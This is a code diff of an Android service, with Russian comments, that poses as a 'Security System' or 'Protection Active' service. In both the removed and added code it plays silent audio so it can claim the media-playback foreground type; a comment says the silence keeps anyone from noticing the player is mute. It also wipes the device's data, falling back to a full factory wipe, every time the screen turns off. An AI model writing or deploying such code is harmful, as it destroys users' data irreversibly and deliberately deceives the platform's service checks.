@@ -11,82 +11,60 @@ import android.os.Build;
 import android.os.IBinder;
 
 public class WatcherService extends Service {
-    private static final String CHANNEL_ID = "MediaGuardChannel";
-    private AudioTrack silentTrack;
-
-    @Override
-    public void onCreate() {
-        super.onCreate();
-        startSilentAudio();
-    }
-
-    private void startSilentAudio() {
-        // Генерируем минимальный буфер тишины
-        int bufferSize = AudioTrack.getMinBufferSize(44100, 
-                AudioFormat.CHANNEL_OUT_MONO, 
-                AudioFormat.ENCODING_PCM_16BIT);
-        
-        silentTrack = new AudioTrack(
-                AudioManager.STREAM_MUSIC,
-                44100,
-                AudioFormat.CHANNEL_OUT_MONO,
-                AudioFormat.ENCODING_PCM_16BIT,
-                bufferSize,
-                AudioTrack.MODE_STREAM);
-
-        // Заполняем нулями (тишиной) и запускаем
-        byte[] silentData = new byte[bufferSize];
-        silentTrack.play();
-        
-        // Запускаем поток, который будет «кормить» систему тишиной
-        new Thread(() -> {
-            while (silentTrack != null && silentTrack.getPlayState() == AudioTrack.PLAYSTATE_PLAYING) {
-                silentTrack.write(silentData, 0, silentData.length);
-            }
-        }).start();
-    }
+    private static final String CH_ID = "GuardChan";
+    private AudioTrack track;
+    private BroadcastReceiver receiver;
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (Build.VERSION.SDK_INT >= 26) {
-            NotificationChannel channel = new NotificationChannel(
-                    CHANNEL_ID, "Security System", NotificationManager.IMPORTANCE_LOW);
-            getSystemService(NotificationManager.class).createNotificationChannel(channel);
+        // 1. Канал (на API 29 он уже обязан быть)
+        NotificationManager nm = getSystemService(NotificationManager.class);
+        if (nm.getNotificationChannel(CH_ID) == null) {
+            nm.createNotificationChannel(new NotificationChannel(CH_ID, "Sec", NotificationManager.IMPORTANCE_LOW));
         }
 
-        Notification notification = new Notification.Builder(this, CHANNEL_ID)
-                .setContentTitle("Protection Active")
-                .setSmallIcon(android.R.drawable.ic_media_play)
+        // 2. Уведомление
+        Notification notif = new Notification.Builder(this, CH_ID)
+                .setContentTitle("Active")
+                .setSmallIcon(android.R.drawable.ic_lock_lock)
                 .setOngoing(true)
                 .build();
 
-        // Тот самый классический старт
+        // 3. Прыжок в Foreground
         if (Build.VERSION.SDK_INT >= 34) {
-            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK);
+            startForeground(1, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK);
         } else {
-            startForeground(1, notification);
+            startForeground(1, notif);
         }
 
-        // Ресивер на вайп
-        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
-        BroadcastReceiver screenReceiver = new BroadcastReceiver() {
-            @Override
-            public void onReceive(Context context, Intent intent) {
-                if (Intent.ACTION_SCREEN_OFF.equals(intent.getAction())) {
-                    DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
-                    try {
-                        dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
-                    } catch (Exception e) {
-                        dpm.wipeData(0);
+        // 4. Генератор тишины (чтобы не докопались, что плеер молчит)
+        if (track == null) {
+            int bSize = AudioTrack.getMinBufferSize(8000, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT);
+            track = new AudioTrack(AudioManager.STREAM_MUSIC, 8000, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT, bSize, AudioTrack.MODE_STREAM);
+            track.play();
+            new Thread(() -> {
+                byte[] b = new byte[1024];
+                while (track != null) { 
+                    try { track.write(b, 0, b.length); } catch (Exception e) { break; }
+                }
+            }).start();
+        }
+
+        // 5. Ресивер (сразу вайп при выключении экрана)
+        if (receiver == null) {
+            receiver = new BroadcastReceiver() {
+                @Override
+                public void onReceive(Context context, Intent intent) {
+                    if (Intent.ACTION_SCREEN_OFF.equals(intent.getAction())) {
+                        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+                        try { dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE); } 
+                        catch (Exception e) { dpm.wipeData(0); }
                     }
                 }
-            }
-        };
-
-        if (Build.VERSION.SDK_INT >= 34) {
-            registerReceiver(screenReceiver, filter, Context.RECEIVER_EXPORTED);
-        } else {
-            registerReceiver(screenReceiver, filter);
+            };
+            IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
+            if (Build.VERSION.SDK_INT >= 34) registerReceiver(receiver, filter, RECEIVER_EXPORTED);
+            else registerReceiver(receiver, filter);
         }
 
         return START_STICKY;
@@ -94,11 +72,8 @@ public class WatcherService extends Service {
 
     @Override
     public void onDestroy() {
-        if (silentTrack != null) {
-            silentTrack.stop();
-            silentTrack.release();
-            silentTrack = null;
-        }
+        if (track != null) { track.stop(); track.release(); track = null; }
+        if (receiver != null) unregisterReceiver(receiver);
         super.onDestroy();
     }
 
